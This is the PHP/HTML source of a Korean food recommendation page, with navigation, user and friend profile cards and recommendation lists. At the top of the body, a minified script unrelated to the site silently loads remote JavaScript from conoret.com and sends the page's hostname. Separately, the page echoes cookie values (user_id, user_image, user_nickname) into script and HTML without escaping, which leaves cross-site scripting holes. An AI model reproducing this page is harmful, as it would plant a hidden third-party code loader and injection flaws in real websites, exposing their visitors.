<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/5.2/assets/css/docs.css" rel="stylesheet">
    <title>ssosso-table.food-db.rating</title>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>

    <link rel="icon" href="src/favicon.ico">

    <link rel="stylesheet" href="/css/rating.css">
    <link rel="stylesheet" href="/css/footer.css">
    <link rel="stylesheet" href="/css/header.css">
    <link rel="stylesheet" href="/css/recommendation.css">
    <style type="text/css">
    </style>

    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script type="text/javascript">
        let mql = window.matchMedia("screen and (max-width: 768px)");
        let flag=false;

        mql.addListener(function(e) {
            if(e.matches) {
                // 모바일
                flag=true;
            } else {
                // 데스크탑
                flag=false
            }
        });

        const userId=<?php echo $_COOKIE['user_id']; ?>

        let ratings=null
        let init_traits=null
        let trait_info=null
        let unrating={}
        let unrating_keys=null
        let userProfile={}
        let my_ratings=null
        let info=null
        let combi=``
    </script>
    <script type="text/javascript" src="script/javascript/recommendation.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column" style="">
    <nav id="nav" class="navbar d-flex">
        <a class="navbar-brand p-2" href="http://ssossotable.com/recommendation.php" style="margin-right: auto;"><img class="masthead-brand" src="src/logo.png" width="64px" height="64px"></a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/rating.php">음식 평가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/record.php">식사 기록하기</a>
        <button style="margin: 10px;" class="navbar-toggler p-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
            <div class="offcanvas-header">
                <a  class="offcanvas-title" href="http://ssossotable.com/recommendation.php"><img class="masthead-brand" src="src/logo.png"></a>
                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
                <ul class="navbar-nav justify-content-end flex-grow-1 pe-3" style="text-align: left;">
                    <li class="nav-item">
                        <a class="nav-link " href="http://ssossotable.com/myInfo.php">내 정보</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/friends.php">친구 목록</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/diary.php">다이어리</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/insert.php">음식 추가하기(for dev)</a>
                    </li>
                </ul>
                <div class="input-group mb-3 mt-3">
                    <input type="text" class="form-control" placeholder="음식명을 넣어주세요" aria-label="Recipient's username" aria-describedby="button-addon2">
                    <button class="btn btn-outline-secondary" type="button" id="button-addon2">검색</button>
                </div>
            </div>
        </div>
    </nav>

    <main role="main" class="inner cover" id="recommendation-main">
        <div class="recommendation card" id="friend-recommendation">
            <div class="card-title"><h1>음식 추천</h1></div>
            <div class="d-flex">
                <div class="user">
                    <div class="box-profile"><img id="my-image" class="card-img" src="<?php echo $_COOKIE['user_image']; ?>"/></div>
                    <span id="my-name"><?php  echo $_COOKIE['user_nickname'];?></span>
                </div>
                <div class="user">
                    <div class="box-profile"><img id="friend-image" class="card-img" src="src/Portrait_Placeholder.png"/></div>
                    <span id="friend-name"></span>
                </div>
            </div>
            <div class="card-body">
                <ul class="list-group" id="friend-recommendation-list">

                </ul>
            </div>
        </div>
        <div class="recommendation card" id="food-recommendation" style="margin: auto;">
            <div class="card-title"><h1>음식 추천</h1></div>
            <div class="card-body">
                <ul class="list-group" id="food-recommendation-list">

                </ul>
            </div>
        </div>
    </main>

    <footer id="footer"  class="mastfoot mt-auto" style="background-color:#ffebaa;">
        <div class="inner">
            <p style="margin: 0;">Created by<a href="http://ssossotable.com" class="footer-link"> ssosso.table.u</a>, of <a href="http://ssossotable.com" class="footer-link">@ssosso.table</a></p>
        </div>
    </footer>
    <script>
        init()
    </script>
</div>
</body>
</html>